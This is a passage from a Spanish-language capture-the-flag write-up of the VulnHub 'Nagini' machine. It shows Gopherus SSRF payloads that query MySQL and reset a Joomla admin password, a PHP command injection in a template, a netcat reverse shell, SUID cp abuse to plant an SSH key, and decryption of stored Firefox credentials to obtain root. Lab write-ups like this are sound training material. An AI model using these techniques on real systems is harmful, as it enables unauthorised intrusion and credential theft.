Your gopher link is ready to do SSRF :                                                                                                                                                                           
                                                                                                                                                                                                                 
gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%19%00%00%00%03%75%73%65%20%6a%6f%6f%6d%6c%61%3b%20%73%68%6f%77%20%74%61%62%6c%65%73%3b%01%00%00%00%01
```

Lo mismo que lo anterior:

<p align="center">
<img src="/assets/images/vulnhub-writeup-nagini/Captura14.png">
</p>

Al final, está una tabla llamada **joomla_users**. Hagamos el mismo procedimiento, usemos la query `use joomla; select * from joomla_users`:
```bash
gopherus --exploit mysql

                                                                                                                                                                                                                 
  ________              .__                                                                                                                                                                                      
 /  _____/  ____ ______ |  |__   ___________ __ __  ______                                                                                                                                                       
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/                                                                                                                                                       
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \                                                                                                                                                        
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >                                                                                                                                                       
        \/       |__|        \/     \/                 \/                                                                                                                                                        
                                                                                                                                                                                                                 
                author: $_SpyD3r_$                                                                                                                                                                               
                                                                                                                                                                                                                 
For making it work username should not be password protected!!!

Give MySQL username: goblin                                                                                                                                                                                      
Give query to execute: use joomla; select * from joomla_users; 

Your gopher link is ready to do SSRF :                                                                                                                                                                           
                                                                                                                                                                                                                 
gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%28%00%00%00%03%75%73%65%20%6a%6f%6f%6d%6c%61%3b%20%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%6a%6f%6f%6d%6c%61%5f%75%73%65%72%73%3b%01%00%00%00%01
```

Lo mismo:

<p align="center">
<img src="/assets/images/vulnhub-writeup-nagini/Captura15.png">
</p>

Obtuvimos un usuario llamado **site_admin**, que al parecer es un superusuario y el hash de su contraseña.

Podríamos tratar de crackear el hash, pero esto no va a funcionar.

Lo que haremos, será cambiar la contraseña del superusuario, para poder entrar al login de **Joomla**.

Para hacer esto, necesitamos saber si tenemos los privilegios suficientes para poder modificar la BD de **Joomla**. Esto lo podemos hacer con la siguiente query `show grants for 'goblin'@'localhost';`. Esta query nos da los privilegios de nuestro usuario. 
```bash
gopherus --exploit mysql

  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

                author: $_SpyD3r_$

For making it work username should not be password protected!!!

Give MySQL username: goblin
Give query to execute: show grants for 'goblin'@'localhost';

Your gopher link is ready to do SSRF : 

gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%26%00%00%00%03%73%68%6f%77%20%67%72%61%6e%74%73%20%66%6f%72%20%27%67%6f%62%6c%69%6e%27%40%27%6c%6f%63%61%6c%68%6f%73%74%27%3b%01%00%00%00%01
```

La subimos y observamos la respuesta:

<p align="center">
<img src="/assets/images/vulnhub-writeup-nagini/Captura16.png">
</p>

Tenemos todos los privilegios activados para la **BD de Joomla**, por lo que podemos cambiar lo que queramos.

Cambiemos la contraseña del superusuario **site_admin**.

La contraseña debe ir cifrada con **MD5** para que funcione, y lo podemos hacer con la herramienta **md5sum** más la contraseña en texto claro:
```bash
echo -n "hackeado123" | md5sum
779d861feba9f80b974837b135f183fa  -
```

Y ahora sí, con la siguiente query actualizamos la contraseña del superusuario **site_admin**: `use joomla; update joomla_users set password='779d861feba9f80b974837b135f183fa' where username='site_admin';`. Aplícala:

```bash
gopherus --exploit mysql
                                                                                                                                                                                                                 
  ________              .__                                                                                                                                                                                      
 /  _____/  ____ ______ |  |__   ___________ __ __  ______                                                                                                                                                       
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/                                                                                                                                                       
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \                                                                                                                                                        
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >                                                                                                                                                       
        \/       |__|        \/     \/                 \/                                                                                                                                                        
                                                                                                                                                                                                                 
                author: $_SpyD3r_$                                                                                                                                                                               
                                                                                                                                                                                                                 
For making it work username should not be password protected!!!

Give MySQL username: goblin                                                                                                                                                                                      
Give query to execute: use joomla; update joomla_users set password='779d861feba9f80b974837b135f183fa' where username='site_admin';

Your gopher link is ready to do SSRF :                                                                                                                                                                           
                                                                                                                                                                                                                 
gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%6d%00%00%00%03%75%73%65%20%6a%6f%6f%6d%6c%61%3b%20%75%70%64%61%74%65%20%6a%6f%6f%6d%6c%61%5f%75%73%65%72%73%20%73%65%74%20%70%61%73%73%77%6f%72%64%3d%27%37%37%39%64%38%36%31%66%65%62%61%39%66%38%30%62%39%37%34%38%33%37%62%31%33%35%66%31%38%33%66%61%27%20%77%68%65%72%65%20%75%73%65%72%6e%61%6d%65%3d%27%73%69%74%65%5f%61%64%6d%69%6e%27%3b%01%00%00%00%01
```

Súbela y revisa bien que tengas el mensaje de cambio en la tabla:

<p align="center">
<img src="/assets/images/vulnhub-writeup-nagini/Captura17.png">
</p>

Parece que sí se cambió.

Vamos a comprobarlo, entrando al login del administrador en la ruta `joomla/administrator` que ya habíamos encontrado con **wfuzz y joomscan**:

<p align="center">
<img src="/assets/images/vulnhub-writeup-nagini/Captura18.png">
</p>

Y estamos dentro:

<p align="center">
<img src="/assets/images/vulnhub-writeup-nagini/Captura19.png">
</p>

### Obteniendo Shell de la Máquina Modificando Plantilla Protostar de Joomla {#Shell}

De acuerdo con la biblia **HackTricks**, podemos modificar la plantilla **Protostar** para introducir código **PHP** que nos ayude a obtener una **CMD**.

Revísalo aquí:
* <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#rce" target="_blank">HackTricks: Joomla - RCE</a>

Vamos a aplicarlo por pasos:
* Vamos a la sección **Extensions** y luego **Templates**:

<p align="center">
<img src="/assets/images/vulnhub-writeup-nagini/Captura20.png">
</p>

* Ahora, seleccionamos la plantilla **Protostar**:

<p align="center">
<img src="/assets/images/vulnhub-writeup-nagini/Captura21.png">
</p>

* La página que usaremos para inyectar la **CMD**, será la de **error.php**:

<p align="center">
<img src="/assets/images/vulnhub-writeup-nagini/Captura22.png">
</p>

* Guarda y con **curl** podemos probar si funcionó:
```bash
curl -s http://192.168.1.006/joomla/templates/protostar/error.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Excelente, si funcionó.

* Abre una **netcat** y desde el navegador, usamos nuestra **Reverse Shell** de confianza para **Bash** (recuerda que hay que URL encodear los ampersands):

<p align="center">
<img src="/assets/images/vulnhub-writeup-nagini/Captura23.png">
</p>

```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.1.006] 46042
bash: cannot set terminal process group (538): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Nagini:/var/www/html/joomla/templates/protostar$ whoami
whoami
www-data
```
Listo, obtuvimos una shell hacia la máquina.

## Post Explotación {#Post}

### Enumeración de la Máquina {#Enumeracion}

Antes que nada, obten una sesión interactiva:
```bash
www-data@Nagini:/home$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@Nagini:/home$ ^Z                
zsh: suspended  nc -nlvp 443
                                                                                                                                                                                                                 
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
www-data@Nagini:/home$ export TERM=xterm
www-data@Nagini:/home$ export SHELL=bash
www-data@Nagini:/home$ stty rows 51 columns 189
www-data@Nagini:/home$
```

Si nos vamos al directorio `/var/www/html`, encontraremos el primer horocrux:
```bash
snape@Nagini:/home/hermoine/bin$ cd /var/www/html/
snape@Nagini:/var/www/html$ ls
harry_potter_2.jpg  horcrux1.txt  index.html  index.nginx-debian.html  internalResourceFeTcher.php  joomla  note.txt
snape@Nagini:/var/www/html$ cat horcrux1.txt 
horcrux_{MzogU2x5dGhFcmlOJ3MgTG9jS0VldCBkRXN0cm9ZZUQgYlkgUm9O}
```

Veamos si tenemos algún privilegio:
```bash
www-data@Nagini:/home$ sudo -l
sudo -l
bash: sudo: command not foun
```
No tenemos.

Busquemos si hay un binario que tenga **permisos SUID**:
```bash
www-data@Nagini:/home$ find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/mount
/usr/bin/su
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/umount
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/home/hermoine/bin/su_cp
```
Parece que hay uno.

Antes de revisarlo, dentro de `/home` hay dos directorios:
```bash
www-data@Nagini:/home$ ls
hermoine  snape
```

Veamos el de **snape**:
```bash
www-data@Nagini:/home$ cd snape
www-data@Nagini:/home/snape$ ls -la
total 32
drwxr-xr-x 4 snape snape 4096 Apr  4  2021 .
drwxr-xr-x 4 root  root  4096 Apr  4  2021 ..
-rw-r--r-- 1 snape snape  220 Apr  3  2021 .bash_logout
-rw-r--r-- 1 snape snape 3526 Apr  3  2021 .bashrc
-rw-r--r-- 1 snape snape   17 Apr  4  2021 .creds.txt
drwx------ 3 snape snape 4096 Apr  4  2021 .gnupg
-rw-r--r-- 1 snape snape  807 Apr  3  2021 .profile
drwx------ 2 snape snape 4096 Apr  4  2021 .ssh
www-data@Nagini:/home/snape$ cat .creds.txt
TG92ZUBsaWxseQ==
```
Encontramos una contraseña y parece que está cifrada en **base64**.

La podemos descifrar con la herramienta **base64**:
```bash
echo "TG92ZUBsaWxseQ==" | base64 -d
...
```

Probemos la contraseña:
```bash
www-data@Nagini:/home/snape$ su snape
Password: 
snape@Nagini:~$ whoami
snape
```
Somos **snape**.

Si nos vamos al directorio `.ssh`, encontraremos un archivo extraño:
```bash
snape@Nagini:~$ cd .ssh
snape@Nagini:~/.ssh$ ls -la
total 12
drwx------ 2 snape snape 4096 Apr  4  2021 .
drwxr-xr-x 4 snape snape 4096 Apr  4  2021 ..
-rw-r--r-- 1 snape snape  222 Apr  4  2021 known_hosts
snape@Nagini:~/.ssh$ cat known_hosts 

|1|6O2f+BIs32tAUn/XAoxMwmGkhOQ=|+eYpmJXrZWCgk5E8e8Q1ouGikpA= ecdsa-sha2-nistp256.....
```
No hay nada más aquí.

Vamos a ver el binario que encontramos antes.

### Ganando Acceso al Usuario Hermoine con Binario cp y Nueva Llave SSH de Usuario snape {#SSH}

Revisando el **binario SUID** que descubrimos, resulta ser una copia de la herramienta **cp**:
```bash
snape@Nagini:/home/hermoine/bin$ ls -la
total 156
drwxr-xr-x 3 hermoine hermoine   4096 Nov 15 01:34 .
drwxr-xr-x 6 hermoine hermoine   4096 Apr  4  2021 ..
-rwsr-xr-x 1 hermoine hermoine 146880 Apr  4  2021 su_cp
snape@Nagini:/home/hermoine/bin# ./su_cp 
./su_cp: missing file operand
Try './su_cp --help' for more information.
```

Como podemos copiar archivos con esta herramienta, una opción a hacer es copiar una nueva llave de **SSH** dentro del directorio **.ssh** del **usuario hermoine**.

Esto lo podemos hacer dentro del **usuario snape** con la herramienta **ssh-keygen**:
```bash
snape@Nagini:~$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/snape/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/snape/.ssh/id_rsa.
Your public key has been saved in /home/snape/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:qHsmRsgWBERodaBTu1wUYFw8C6lZZe4unC1b3+P7FUg snape@Nagini
The key's randomart image is:
+---[RSA 2048]----+

|=+o*BB.          |
|..==*o           |
|.++..oo    E     |
| o+ +. .  . .    |
| . = .. S  . .   |
|  = =.        .  |
| . *.+       .   |
|    B.+ ..  .    |
|   o.+ ..++.     |
+----[SHA256]-----+
snape@Nagini:~$ ls -la .ssh
total 20
drwx------ 2 snape snape 4096 Nov 15 01:54 .
drwxr-xr-x 4 snape snape 4096 Apr  4  2021 ..
-rw------- 1 snape snape 1876 Nov 15 01:54 id_rsa
-rw-r--r-- 1 snape snape  394 Nov 15 01:54 id_rsa.pub
-rw-r--r-- 1 snape snape  222 Apr  4  2021 known_hosts
```
Ya está creada.

Ahora copiamos la llave pública en un archivo temporal que llamaremos **authorized_keys** en el **directorio tmp**. Le asignaremos los permisos correctos para que funcione la llave pública (640) y la copiaremos dentro del **directorio .ssh** del **usuario hermoine**:
```bash
snape@Nagini:~$ cp .ssh/id_rsa.pub /tmp/authorized_keys
snape@Nagini:~$ chmod 640 /tmp/authorized_keys 
snape@Nagini:~$ cd /home/hermoine/bin
snape@Nagini:/home/hermoine/bin$ ./su_cp /tmp/authorized_keys ../.ssh/authorized_keys
```
Con esto ya debería estar listo nuestro acceso.

Probemos a intentar autenticarnos al **servicio SSH** con el **usuario hermoine**:
```bash
snape@Nagini:/home/hermoine/bin$ ssh hermoine@localhost
Enter passphrase for key '/home/snape/.ssh/id_rsa': 
Linux Nagini 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Apr  4 16:43:01 2021 from ::1
hermoine@Nagini:~$ whoami
hermoine
```
Listo, ya somos el **usuario hermoine**.

Podemos ver el segundo horocrux:
```bash
hermoine@Nagini:~$ ls -la
total 28
drwxr-xr-x 6 hermoine hermoine 4096 Apr  4  2021 .
drwxr-xr-x 4 root     root     4096 Apr  4  2021 ..
drwxr-xr-x 3 hermoine hermoine 4096 Nov 15 01:34 bin
drwx------ 3 hermoine hermoine 4096 Apr  4  2021 .gnupg
-r--r----- 1 hermoine hermoine   75 Apr  4  2021 horcrux2.txt
drwx------ 5 hermoine hermoine 4096 Jun  1  2019 .mozilla
drwxr-xr-x 2 hermoine hermoine 4096 Nov 15 01:59 .ssh
hermoine@Nagini:~$ cat horcrux2.txt 
horcrux_{NDogSGVsZ2EgSHVmZmxlcHVmZidzIEN1cCBkZXN0cm95ZWQgYnkgSGVybWlvbmU=}
```
Busquemos cómo escalar privilegios a **Root**.

### Crackeando Contraseña de Almacenada de Moziila para ser Root {#Mozilla}

Dentro del directorio `/.mozilla/firefox/g2mhbq0o.default`, podemos encontrar todos los archivos de **Mozilla FireFox**:
```bash
hermoine@Nagini:~/.mozilla$ ls -la firefox/g2mhbq0o.default/
total 13092
drwx------ 14 hermoine hermoine    4096 Apr  4  2021 .
drwx------  5 hermoine hermoine    4096 Jun  1  2019 ..
-rw-r--r--  1 hermoine hermoine    1923 Apr  4  2021 addons.json
-rw-------  1 hermoine hermoine    3560 Apr  4  2021 addonStartup.json.lz4
-rw-r--r--  1 hermoine hermoine       0 Apr  4  2021 AlternateServices.txt
-rw-------  1 hermoine hermoine  338425 Sep 11  2019 blocklist.xml
drwx------  2 hermoine hermoine    4096 Dec 20  2020 bookmarkbackups
-rw-------  1 hermoine hermoine     216 Apr  4  2021 broadcast-listeners.json
-rw-------  1 hermoine hermoine  294912 Dec 20  2020 cert9.db
...
...
...
```

Resulta y acontece, que existen 2 archivos que almacenan las contraseñas de los usuarios que guardan sus credenciales en el navegador **FireFox**, estos son:
* *key4.db*
* *logins.json*

Esto de acuerdo con lo que nos cuenta **HackTricks**:
* <a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/browser-artifacts#firefox" target="_blank">HackTricks: Browser Artifacts - FireFox</a>

Y para poder desencriptar esas credenciales, podemos usar dos herramientas **firepwd.py o firefox_decrypt.py**:
* <a href="https://github.com/unode/firefox_decrypt" target="_blank">Repositorio de unode: firefox_decrypt</a>
* <a href="https://github.com/lclevy/firepwd" target="_blank">Repositorio de lclevy: firepwd</a>

Vamos a usar ambos para ver qué obtenemos.

#### Utilizando firefox_decrypt.py para Obtener Credenciales Almacenadas de FireFox {#firefoxDecrypt}

Primero, descarguemos la herramienta:
```bash
wget https://raw.githubusercontent.com/unode/firefox_decrypt/refs/heads/main/firefox_decrypt.py
--2024-11-14 14:38:57--  https://raw.githubusercontent.com/unode/firefox_decrypt/refs/heads/main/firefox_decrypt.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)... connected.
HTTP request sent, awaiting response... 200 OK
Length: 39405 (38K) [text/plain]
Saving to: ‘firefox_decrypt.py’

firefox_decrypt.py       100%[==================>]  38.48K  --.-KB/s    in 0.05s   

2024-11-14 14:38:57 (807 KB/s) - ‘firefox_decrypt.py’ saved [39405/39405]
```

Ahora, necesitamos el **directorio .mozilla**, pero solamente el **usuario hermoine** puede entrar y ver su contenido, así que vamos a modificar sus permisos, para que cualquiera pueda hacer lo mismo:
```bash
hermoine@Nagini:~$ chmod -R 755 .mozilla/
hermoine@Nagini:~$ ls -la .mozilla/
total 20
drwsr-xr-x 5 hermoine hermoine 4096 Jun  1  2019 .
drwxr-xr-x 6 hermoine hermoine 4096 Nov 15 06:52 ..
drwxr-xr-x 2 hermoine hermoine 4096 Jun  1  2019 extensions
drwxr-xr-x 5 hermoine hermoine 4096 Jun  1  2019 firefox
drwxr-xr-x 2 hermoine hermoine 4096 Jun  1  2019 systemextensionsdev
```
Listo.

Y con la herramienta **scp**, vamos a copiar ese directorio, usando la cuenta del **usuario snape**:
```bash
scp -r snape@192.168.1.006:/home/hermoine/.mozilla .
snape@192.168.1.006's password: 
profiles.ini                                    100%  175    47.2KB/s   00:00    
InstallTime20190517140819                       100%   10     2.9KB/s   00:00    
InstallTime20190828152820                       100%   10     3.0KB/s   00:00    
...
...
...
...
```
Excelente.

Moveré el **directorio .mozilla** a otro directorio solo para que quede mejor ordenado y luego ejecutamos el **firefox_decrypt.py**, indicando la ruta del directorio `.mozilla/firefox`:
```bash
python3 firefox_decrypt.py Firefox_creds/.mozilla/firefox

Website:   http://nagini.hogwarts
Username: 'root'
Password: '...'
```
Muy bien, tenemos las credenciales del **Root**.

#### Utilizando firepwd.py para Crackear Credenciales de logins.json de FireFox {#firepwd}

Descargamos solamente el script:
```bash
wget https://raw.githubusercontent.com/lclevy/firepwd/refs/heads/master/firepwd.py
--2024-11-14 14:42:52--  https://raw.githubusercontent.com/lclevy/firepwd/refs/heads/master/firepwd.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)... connected.
HTTP request sent, awaiting response... 200 OK
Length: 14856 (15K) [text/plain]
Saving to: ‘firepwd.py’

firepwd.py                      100%[==========================>]  14.51K  --.-KB/s    in 0.01s   

2024-11-14 14:42:53 (1.09 MB/s) - ‘firepwd.py’ saved [14856/14856]
```

Para esta herramienta, únicamente necesitamos el archivo **logins.json** que se encuentra en el directorio `.mozilla/firefox`. Podemos descargarlo, si como **hermoine o snape** nos posicionamos ahí y levantamos un servidor con **Python**, que sí lo tenemos en la máquina víctima:
```bash
hermoine@Nagini:~/.mozilla$ which python3
/usr/bin/python3
```

Actívalo y con **wget**, obtén ese archivo:
```bash
wget http://192.168.1.006:4433/logins.json
--2024-11-14 14:44:11--  http://192.168.1.006:4433/logins.json
Connecting to 192.168.1.006:4433... connected.
HTTP request sent, awaiting response... 200 OK
Length: 593 [application/json]
Saving to: ‘logins.json’

logins.json    100%[==================>]     593  --.-KB/s    in 0.001s  

2024-11-14 14:44:11 (729 KB/s) - ‘logins.json’ saved [593/593]
```
Bien.

Por último, ubicamos el archivo **logins.json** junto al script y lo ejecutamos:
```bash
python3 firepwd.py
globalSalt: b'db8e223cef34f55b9458f52286120b8fb5293c95'
 SEQUENCE {
   SEQUENCE {
...
...
...
...
...
 }
entrySalt: b'11c73a5fe855de5d96e9a06a8503019d00efa9e4'
b'233bb64646075d9dfe8c464f94f4df235234d94f4c2334940808080808080808'
decrypting login/password pairs
http://nagini.hogwarts:b'root',b'...'
```
Al final, volvimos a obtener las credenciales del **Root**.

Ya solo probamos la contraseña que obtuvimos y obtenemos el último horocrux:
```bash
ssh root@192.168.1.006
root@192.168.1.006's password: 
Linux Nagini 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Apr  4 18:01:59 2021
root@Nagini:~# ls
horcrux3.txt
root@Nagini:~# cat horcrux3.txt 
  ____                            _         _       _   _                 
 / ___|___  _ __   __ _ _ __ __ _| |_ _   _| | __ _| |_(_) ___  _ __  ___ 

| |   / _ \| '_ \ / _` | '__/ _` | __| | | | |/ _` | __| |/ _ \| '_ \/ __|
| |__| (_) | | | | (_| | | | (_| | |_| |_| | | (_| | |_| | (_) | | | \__ \
 \____\___/|_| |_|\__, |_|  \__,_|\__|\__,_|_|\__,_|\__|_|\___/|_| |_|___/

                  |___/                                                   

Machine Author: Mansoor R (@time4ster)
Machine Difficulty: Medium
Machine Name: Nagini
Horcruxes Hidden in this VM: 3 horcruxes

You have successfully pwned Nagini machine.
Here is your third hocrux: horcrux_{NTogRGlhZGVtIG9mIFJhdmVuY2xhdyBkZXN0cm95ZWQgYnkgSGFycnk=}

# For any queries/suggestions feel free to ping me at email: time4ster@protonmail.com
```
Con esto, ya completamos la máquina.

Veamos qué dicen los horocruxes:
```bash
# Horocrux 3:
echo -n "MzogU2x5dGhFcmlOJ3MgTG9jS0VldCBkRXN0cm9ZZUQgYlkgUm9O" | base64 -d
3: SlythEriN's LocKEet dEstroYeD bY RoN

# Horocrux 4:
echo -n "NDogSGVsZ2EgSHVmZmxlcHVmZidzIEN1cCBkZXN0cm95ZWQgYnkgSGVybWlvbmU=" | base64 -d
4: Helga Hufflepuff's Cup destroyed by Hermione

# Horocrux 5:
echo -n "NTogRGlhZGVtIG9mIFJhdmVuY2xhdyBkZXN0cm95ZWQgYnkgSGFycnk=" | base64 -d
5: Diadem of Ravenclaw destroyed by Harry
```
Completado.
